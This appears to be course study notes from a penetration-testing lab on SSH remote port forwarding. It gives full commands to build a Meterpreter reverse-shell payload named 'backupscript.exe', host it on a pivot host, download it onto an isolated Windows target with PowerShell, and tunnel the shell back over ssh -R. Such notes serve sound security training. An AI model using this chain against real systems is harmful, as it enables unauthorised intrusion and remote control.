# SSH Remote Port Forwarding

### Technique Overview

**SSH Remote Port Forwarding** is utilized when a **target host** lacks a direct route to the **attack host** but can communicate with a **pivot host** that has access to both networks. This technique is essential for capturing **reverse shells** from internal systems that are restricted to their local subnet (e.g., 172.16.5.0/23) and cannot reach the external Academy Lab network.

### Operational Workflow

1. **Generate a Payload:** Create a Meterpreter payload using `msfvenom`. The **LHOST** must be the **internal IP of the pivot host** because the target cannot reach the attack machine directly.
2. **Configure the Listener:** Set up a `multi/handler` on the attack machine. The **LPORT** should match the local port you intend to forward traffic to.
3. **Transfer Payload to Pivot:** Move the executable from the attack host to the pivot host using `scp`.
4. **Host the Payload:** Start a web server on the pivot host to allow the target machine to download the payload.
5. **Download on Target:** Use PowerShell or a web browser on the target machine to retrieve the payload from the pivot host.
6. **Establish SSH Remote Port Forward:** Run the SSH command from the **attack host** to the **pivot host**. This tells the pivot host to listen on a specific port and forward all incoming traffic back to the attack host's listener.
7. **Execute and Catch:** Run the payload on the target. The connection travels to the pivot host, which forwards it through the SSH tunnel to the attack host.

---

### Command Reference

|Action|Command|
|:--|:--|
|**Generate Payload**|`msfvenom -p windows/x64/meterpreter/reverse_https lhost=<PIVOT_IP> -f exe -o backupscript.exe LPORT=<REMOTE_PORT>`|
|**Start Listener**|`msf6 > use exploit/multi/handler` `msf6 > set payload windows/x64/meterpreter/reverse_https` `msf6 > set lhost 0.0.0.0` `msf6 > set lport <LOCAL_PORT>` `msf6 > run`|
|**Transfer to Pivot**|`scp backupscript.exe <USERNAME>@<PIVOT_IP>:~/`|
|**Host on Pivot**|`python3 -m http.server <PORT>`|
|**Download on Target**|`Invoke-WebRequest -Uri "http://<PIVOT_IP>:<PORT>/backupscript.exe" -OutFile "C:\backupscript.exe"`|
|**Setup Remote Forward**|`ssh -R <PIVOT_IP>:<REMOTE_PORT>:0.0.0.0:<LOCAL_PORT> <USERNAME>@<PIVOT_IP> -vN`|

---

### Key Parameters for SSH -R

|Parameter|Description|
|:--|:--|
|`-R`|Asks the remote (pivot) server to listen on a specific port and forward connections back to the local (attack) host.|
|`<PIVOT_IP>:<REMOTE_PORT>`|The IP and port the **pivot host** will listen on to receive the reverse shell.|
|`0.0.0.0:<LOCAL_PORT>`|The local address and port on the **attack host** where the listener is running.|
|`-vN`|**Verbose** output (helpful for debugging) and **No shell** (prevents opening an interactive login session).|

### Attack Implications

- **Source Verification:** When checking `netstat` on the attack host, the incoming connection will appear as originating from `127.0.0.1` because traffic is received over the **local SSH socket**.
- **Functionality:** This technique unlocks the ability to use **Meterpreter** features (e.g., Windows API exploitation, automated enumeration) that are unavailable via standard RDP or built-in Windows executables.
- **Bypassing Isolation:** Successfully establishes a connection even when the target has **no direct routing** to the attack network.